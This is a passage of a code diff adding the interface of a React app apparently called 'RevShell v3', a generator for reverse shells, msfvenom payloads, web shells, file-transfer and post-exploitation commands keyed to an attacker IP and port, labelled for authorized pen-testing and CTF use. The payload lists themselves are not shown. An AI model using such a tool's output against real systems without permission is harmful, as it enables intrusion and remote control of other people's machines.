+              {ip&&!ipValid&&<span style={{position:"absolute",right:-16,top:"50%",transform:"translateY(-50%)",color:"#ff4444",fontSize:10}}>!</span>}
+            </div>
+            <span style={{color:"#1e3a1e",fontSize:10,letterSpacing:1,whiteSpace:"nowrap"}}>LPORT</span>
+            <input
+              value={port}
+              onChange={e=>setPort(e.target.value)}
+              placeholder="4444"
+              style={{...IS,width:64,borderColor:port&&!portValid?"rgba(255,68,68,0.5)":"#1a2a1a"}}
+              onFocus={e=>{e.target.style.borderColor="rgba(0,255,170,0.35)";}}
+              onBlur={e=>{e.target.style.borderColor=port&&!portValid?"rgba(255,68,68,0.5)":"#1a2a1a";}}
+            />
+            <span style={{color:"#00ffaa",fontSize:11,opacity:.3,width:9,userSelect:"none"}}>
+              {cursor?"█":""}
+            </span>
+          </div>
+          <div style={{display:"flex",gap:5,flexShrink:0}}>
+            <button onClick={()=>setShowAI(true)} style={{background:"rgba(0,170,255,0.07)",border:"1px solid rgba(0,170,255,0.2)",borderRadius:6,color:"#00aaff",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,whiteSpace:"nowrap"}}>🤖 AI</button>
+            <button onClick={()=>setShowFlow(true)} style={{background:"rgba(0,255,170,0.06)",border:"1px solid rgba(0,255,170,0.2)",borderRadius:6,color:"#00ffaa",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,whiteSpace:"nowrap"}}>⚡ Workflow</button>
+            <button onClick={()=>setShowHistory(true)} style={{background:"rgba(255,255,255,0.02)",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 8px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>H</button>
+            <button onClick={()=>setShowDiff(true)} style={{background:"rgba(255,255,255,0.02)",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 8px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>D</button>
+            <button onClick={()=>setShowKeys(true)} title="Keyboard shortcuts (?)" style={{background:"rgba(255,255,255,0.02)",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 8px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>?</button>
+          </div>
+        </div>
+        <div style={{display:"flex",gap:0,padding:"0 14px",overflowX:"auto"}}>
+          {tabDefs.map(t=>(
+            <button
+              key={t.id}
+              onClick={()=>setTab(t.id)}
+              style={{background:"none",border:"none",borderBottom:`2px solid ${tab===t.id?"#00ffaa":"transparent"}`,color:tab===t.id?"#00ffaa":"#3a5a3a",padding:"9px 14px",fontSize:11,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,whiteSpace:"nowrap",display:"flex",alignItems:"center",gap:5}}
+            >
+              <span>{t.icon}</span>
+              {t.label}
+              {t.badge!=null&&(
+                <span style={{fontSize:9,color:tab===t.id?"#00ffaa55":"#1e3a1e",background:"rgba(255,255,255,0.03)",padding:"1px 5px",borderRadius:10}}>
+                  {t.badge}
+                </span>
+              )}
+              {t.id==="shells"&&favorites.length>0&&(
+                <span style={{fontSize:9,color:"#665500",background:"rgba(255,200,0,0.08)",border:"1px solid rgba(255,200,0,0.15)",padding:"1px 5px",borderRadius:10}}>
+                  ⭐{favorites.length}
+                </span>
+              )}
+            </button>
+          ))}
+        </div>
+      </header>
+
+      {/* BODY */}
+      <div style={{flex:1,overflow:"hidden",display:"flex",flexDirection:"column",minHeight:0}}>
+        {tab==="shells"&&(
+          <RevShellsTab
+            ip={ip}
+            port={port}
+            favorites={favorites}
+            onToggleFav={toggleFav}
+            customShells={customShells}
+            onAddCustom={addCustomShell}
+            addHistory={addHistory}
+          />
+        )}
+        {tab==="msf"&&(
+          <div style={{overflowY:"auto",flex:1}}>
+            <MsfvenomTab ip={ip} port={port}/>
+          </div>
+        )}
+        {tab==="webshell"&&(
+          <div style={{overflowY:"auto",flex:1}}>
+            <WebShellsTab ip={ip} port={port}/>
+          </div>
+        )}
+        {tab==="filetx"&&(
+          <div style={{overflowY:"auto",flex:1}}>
+            <FileTransferTab ip={ip} port={port}/>
+          </div>
+        )}
+        {tab==="postex"&&(
+          <div style={{overflowY:"auto",flex:1}}>
+            <PostExTab/>
+          </div>
+        )}
+      </div>
+
+      {/* FOOTER */}
+      <footer style={{borderTop:"1px solid #0a140a",padding:"6px 18px",display:"flex",alignItems:"center",justifyContent:"space-between",background:"rgba(2,4,2,0.9)",fontSize:10,color:"#162216",fontFamily:"monospace",flexWrap:"wrap",gap:6}}>
+        <span>
+          RevShell v3 · Authorized pen-testing &amp; CTF only ·
+          <kbd style={{background:"rgba(255,255,255,0.04)",border:"1px solid #1a2a1a",borderRadius:3,padding:"1px 5px",margin:"0 3px"}}>/</kbd>search
+          <kbd style={{background:"rgba(255,255,255,0.04)",border:"1px solid #1a2a1a",borderRadius:3,padding:"1px 5px",margin:"0 3px"}}>?</kbd>shortcuts
+          <kbd style={{background:"rgba(255,255,255,0.04)",border:"1px solid #1a2a1a",borderRadius:3,padding:"1px 5px",margin:"0 3px"}}>1–5</kbd>tabs
+        </span>
+        <span>
+          ⚡ {SHELLS_BASE.length+customShells.length} shells · {WEB_SHELLS.length} webshells · {Object.values(MSF_PAYLOADS).flat().length} MSF · {Object.values(FILE_TRANSFER).flat().length} transfer methods
+        </span>
+      </footer>
+
+      {/* MODALS */}
+      {showFlow&&<WorkflowPanel ip={ip} port={port} onClose={()=>setShowFlow(false)}/>}
+      {showAI&&<AIAdvisorModal ip={ip} port={port} onClose={()=>setShowAI(false)}/>}
+      {showKeys&&<ShortcutsModal onClose={()=>setShowKeys(false)}/>}
+      {showHistory&&<HistoryPanel history={history} onClear={clearHistory} onClose={()=>setShowHistory(false)}/>}
+      {showDiff&&<DiffModal onClose={()=>setShowDiff(false)}/>}
+
+      {/* TOAST */}
+      <Toast message={toast.msg} visible={toast.visible}/>
+    </div>
+  );
+}
+
+const root=ReactDOM.createRoot(document.getElementById("root"));
+root.render(<App/>);
+</script>
+</body>
+</html>
